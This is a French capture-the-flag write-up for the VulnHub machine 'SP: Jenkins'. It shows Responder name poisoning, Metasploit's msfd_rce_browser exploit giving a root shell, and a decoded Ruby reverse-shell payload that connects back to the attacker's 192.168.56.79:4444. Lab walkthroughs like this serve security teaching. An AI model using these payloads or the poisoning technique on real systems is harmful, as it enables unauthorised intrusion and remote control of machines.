# Solution du CTF SP: Jenkins de VulnHub

Ce CTF [SP: jenkins](https://www.vulnhub.com/entry/sp-jenkins,276/) m'a posé quelques difficultés, la faute... à un service qui mettait du temps à démarrer.

```
Nmap scan report for 192.168.56.78
Host is up (0.00018s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.34 ((Ubuntu))
|_http-server-header: Apache/2.4.34 (Ubuntu)
|_http-title: Hax0r blog!
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp  open  http        Apache httpd 2.4.34
|_http-server-header: Apache/2.4.34 (Ubuntu)
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 4.9K  2018-12-28 23:50  dirtycow.c
| 7.3K  2018-12-28 23:50  mempodipper.c
|_
445/tcp  open  netbios-ssn Samba smbd 4.8.4-Ubuntu (workgroup: WORKGROUP)
4444/tcp open  krb524?
5355/tcp open  llmnr?
MAC Address: 08:00:27:BE:DE:F5 (Oracle VirtualBox virtual NIC)
Service Info: Hosts: JENKINS, 127.0.1.1

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -20m02s, deviation: 34m38s, median: -2s
| smb2-time: 
|   date: 2022-12-19T08:01:09
|_  start_date: N/A
|_nbstat: NetBIOS name: JENKINS, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required    
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.8.4-Ubuntu)
|   Computer name: jenkins
|   NetBIOS computer name: JENKINS\x00
|   Domain name: \x00
|   FQDN: jenkins
|_  System time: 2022-12-19T09:01:09+01:00
```

## Un seul port vous manque, et tout est dépeuplé.

Sur le port 80 on trouve une page où quelqu'un a placé quelques exemples d'utilisation de Metasploit.

En bas de page on trouve un lien menant sur cet article : [Running Metasploit Remotely | Metasploit Documentation](https://docs.rapid7.com/metasploit/running-metasploit-remotely/)

Comme j'ai aussi vu le port `LLMNR` j'ai lancé Kali Linux puis `Responder` histoire de voir ce qu'il se trame :

```shellsession
┌──(kali㉿kali)-[~]
└─$ sudo responder -I eth0 -v                             
[sudo] Mot de passe de kali : 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
--- snip ---
[+] Listening for events...                                                                                                                                                                                                                 

[*] [MDNS] Poisoned answer sent to fe80::ab2a:ba79:8a4a:8bb9 for name epicexploits.local
[*] [MDNS] Poisoned answer sent to 192.168.56.78   for name epicexploits.local
```

La machine cherche à contacter `epicexploits.local` dont `Responder` usurpe l'adresse.

Si on surveille le trafic avec Wireshark on voit qu'après un moment un *Firefox 63* demande la page d'index de notre port 80.

J'ai fouillé dans les exploits dont Metasploit dispose :

```
msf6 exploit(multi/browser/adobe_flash_opaque_background_uaf) > search platform:linux firefox

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   exploit/multi/browser/adobe_flash_uncompress_zlib_uaf       2014-04-28       great      No     Adobe Flash Player ByteArray UncompressViaZlibVariant Use After Free
   1   exploit/multi/browser/adobe_flash_hacking_team_uaf          2015-07-06       great      No     Adobe Flash Player ByteArray Use After Free
   2   exploit/multi/browser/adobe_flash_shader_drawing_fill       2015-05-12       great      No     Adobe Flash Player Drawing Fill Shader Memory Corruption
   3   exploit/multi/browser/adobe_flash_nellymoser_bof            2015-06-23       great      No     Adobe Flash Player Nellymoser Audio Decoding Buffer Overflow
   4   exploit/multi/browser/adobe_flash_net_connection_confusion  2015-03-12       great      No     Adobe Flash Player NetConnection Type Confusion
   5   exploit/multi/browser/adobe_flash_pixel_bender_bof          2014-04-28       great      No     Adobe Flash Player Shader Buffer Overflow
   6   exploit/multi/browser/adobe_flash_shader_job_overflow       2015-05-12       great      No     Adobe Flash Player ShaderJob Buffer Overflow
   7   exploit/multi/browser/firefox_proto_crmfrequest             2013-08-06       excellent  No     Firefox 5.0 - 15.0.1 __exposedProps__ XCS Code Execution
   8   exploit/multi/browser/firefox_jit_use_after_free            2020-11-18       manual     No     Firefox MCallGetProperty Write Side Effects Use After Free Exploit
   9   exploit/multi/browser/firefox_queryinterface                2006-02-02       normal     No     Firefox location.QueryInterface() Code Execution
   10  exploit/multi/browser/java_jre17_exec                       2012-08-26       excellent  No     Java 7 Applet Remote Code Execution
   11  exploit/multi/browser/java_rhino                            2011-10-18       excellent  No     Java Applet Rhino Script Engine Remote Code Execution
   12  exploit/multi/browser/firefox_xpi_bootstrapped_addon        2007-06-27       excellent  No     Mozilla Firefox Bootstrapped Addon Social Engineering Code Execution
   13  exploit/multi/browser/mozilla_navigatorjava                 2006-07-25       normal     No     Mozilla Suite/Firefox Navigator Object Code Execution
   14  post/multi/gather/firefox_creds                                              normal     No     Multi Gather Firefox Signon Credential Collection
   15  post/multi/gather/ssh_creds                                                  normal     No     Multi Gather OpenSSH PKI Credentials Collection
   16  post/multi/manage/play_youtube                                               normal     No     Multi Manage YouTube Broadcast
   17  post/multi/manage/hsts_eraser                                                normal     No     Web browsers HSTS entries eraser63
```

Ils sont soit trop vieux pour cette version du browser, soit trop récents pour être réaliste (l'exploit de 2020 n'existait pas au moment de la création du CTF en 2018).

J'ai cherché à voir s'il n'y avais pas un plugin de navigateur (Flash, Java) qui serait vulnérable mais sans succès.

Après un long moment d'égarement j'ai finalement rescanné la machine et il y avait quelque chose de plus :

```
3790/tcp  open  http        nginx
|_http-title: Did not follow redirect to https://192.168.56.78:3790/
```

Damn ! Il s'agit d'une interface web pour Metasploit mais l'accès est restreint :

> **Warning:** For your protection, access to Metasploit is limited to the [local host](https://127.0.0.1:3790/) until the initial user account has been configured. The initial user account can be created manually by launching the "diagnostic_shell" script in the base of the installation and executing "[INSTALL_PATH]/createuser".

On sait que Metasploit peut être assez long à démarrer, j'en ai fait les frais ici.

## use selfpwn

Metasploit dispose d'un module pour s'exploiter lui-même qui s'appelle `multi/browser/msfd_rce_browser` :

>   This module connects to the msfd-socket through the victim's browser.
> 
>   To execute msfconsole-commands in JavaScript from a web application, this module places the payload in the POST-data.
> 
>   These POST-requests can be sent cross-domain and can therefore be sent to localhost on the victim's machine.
> 
>   The msfconsole-command to execute code is 'rbi -e "CODE"'.
> 
>   Exploitation when the browser is running on Windows is unreliable and the exploit is only usable when IE is used and the quiet-flag has been passed to msf-daemon.

Du coup il faut s'assurer que `Responder` ne monopolise pas le port 80, ce que l'on fait en mettant `HTTP` à `Off` dans `/etc/responder/Responder.conf`.

Ensuite j'utilise le module Metasploit avec les options suivantes :

```
msf6 exploit(multi/browser/msfd_rce_browser) > show options

Module options (exploit/multi/browser/msfd_rce_browser):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   REMOTE_IP    127.0.0.1        yes       Remote IP address when called from victim
   REMOTE_PORT  55554            yes       Remote port the service is running at
   SRVHOST      0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT      80               yes       The local port to listen on.
   SSL          false            no        Negotiate SSL for incoming connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH      /                no        The URI to use for this exploit (default is random)


Payload options (ruby/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.56.79    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(multi/browser/msfd_rce_browser) > run
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.56.79:4444 
msf6 exploit(multi/browser/msfd_rce_browser) > [*] Using URL: http://192.168.56.79/
[*] Server started.
[*] 192.168.56.78    msfd_rce_browser - 192.168.56.78    msfd_rce_browser Sending HTML...
[*] 192.168.56.78    msfd_rce_browser - 192.168.56.78    msfd_rce_browser Sending HTML...
[*] Command shell session 2 opened (192.168.56.79:4444 -> 192.168.56.78:53728)
msf6 exploit(multi/browser/msfd_rce_browser) > sessions -i 2
[*] Starting interaction with 2...

id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
flag.txt
cat flag.txt
89e1d7a61d87b
```

r00t3d !

## Keskicépacé

Si on requête notre port 80 on obtient le code HTML suivant qui génère une XHR avec en body une commande `irb` :

```html
<html>
<head></head>
<body>
<script>
var ILScHZQn = new XMLHttpRequest();
ILScHZQn.open("POST","http://127.0.0.1:55554/", true);
var RHZPEArroid = String("\x65\x76\x61\x6c\x28\x25\x28--- snip ---\x66\x69\x72\x73\x74\x29");
ILScHZQn.send("irb -e \"" + RHZPEArroid + "\"\n");
</script>
</body>
</html>
```

La chaine hexa se décode en quelque chose comme ça :

```ruby
eval(%(Y29kZSA9ICUoY21WeGRXbHlaU0FuYzI--- snip ---Y29kZSkgcmVzY3VlIG5pbAplbmQKZW5k).unpack(%(m0)).first)
```

Dedans c'est du code Ruby, visiblement un template car il ne fait que décoder et exécuter le payload :

```ruby
code = %(cmVxdWlyZSAnc29ja2V0JztjPVRDUFNvY2tldC5uZXcoIjE5Mi4xNjguNTYuNzkiLCA0NDQ0KTskc3RkaW4ucmVvcGVuKGMpOyRzdGRvdXQucmVvcGVuKGMpOyRzdGRlcnIucmVvcGVuKGMpOyRzdGRpbi5lYWNoX2xpbmV7fGx8bD1sLnN0cmlwO25leHQgaWYgbC5sZW5ndGg9PTA7KElPLnBvcGVuKGwsInJiIil7fGZkfCBmZC5lYWNoX2xpbmUge3xvfCBjLnB1dHMoby5zdHJpcCkgfX0pIHJlc2N1ZSBuaWwgfQ==).unpack(%(m0)).first
if RUBY_PLATFORM =~ /mswin|mingw|win32/
inp = IO.popen(%(ruby), %(wb)) rescue nil
if inp
inp.write(code)
inp.close
end
else
if ! Process.fork()
eval(code) rescue nil
end
end
```

Il s'agit de celui qu'on a sélectionné (`ruby/shell_reverse_tcp`) :

```ruby
require 'socket';
c=TCPSocket.new("192.168.56.79", 4444);
$stdin.reopen(c);
$stdout.reopen(c);
$stderr.reopen(c);
$stdin.each_line{|l|l=l.strip;next if l.length==0;(IO.popen(l,"rb"){|fd| fd.each_line {|o| c.puts(o.strip) }}) rescue nil }
```

Côté CTF on a une entrée dans la crontab de l'utilisateur `jenkins` :

```bash
*/3 * * * * DISPLAY=:0 /bin/bash /home/jenkins/browse.sh
```

Elle ne fait que relancer Firefox :

```bash
killall firefox; firefox http://epicexploits.local
```

La crontab s'exécute avec les droits de `jenkins` mais comme la requête est relayée vers le service `msfd` qui tourne en root notre shell obtenu a bien les droits root.

*Publié le 20 décembre 2022*


